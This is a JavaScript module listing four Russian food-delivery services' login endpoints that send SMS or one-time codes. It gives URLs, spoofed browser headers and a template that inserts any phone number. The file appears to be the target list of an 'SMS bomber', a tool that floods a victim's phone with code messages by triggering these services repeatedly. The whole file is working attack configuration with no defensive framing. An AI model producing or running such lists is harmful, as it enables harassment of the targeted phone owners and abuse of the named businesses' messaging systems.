module.exports = [
  {
    name: "M-Food",
    url: "https://spb.m-food.ru/local/components/mfood/auth/ajax.php",
    method: "POST",
    headers: { 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    },
    data: (phone) => `action=send_code&phone=${phone}`
  },
  {
    name: "Allo Pizza",
    url: "https://allopizza.su/api/v1/auth/otp",
    method: "POST",
    headers: { 
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Safari/537.36"
    },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "GrowFood",
    url: "https://growfood.pro/api/v1/auth/login",
    method: "POST",
    headers: { 
        "Content-Type": "application/json",
        "Origin": "https://growfood.pro",
        "Referer": "https://growfood.pro/"
    },
    data: (phone) => ({ phone: phone })
  },
  {
    name: "LetBeFit",
    url: "https://spb.letbefit.ru/ajax/auth.php",
    method: "POST",
    headers: { 
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    },
    data: (phone) => `action=send_sms&phone=${phone}`
  }
];
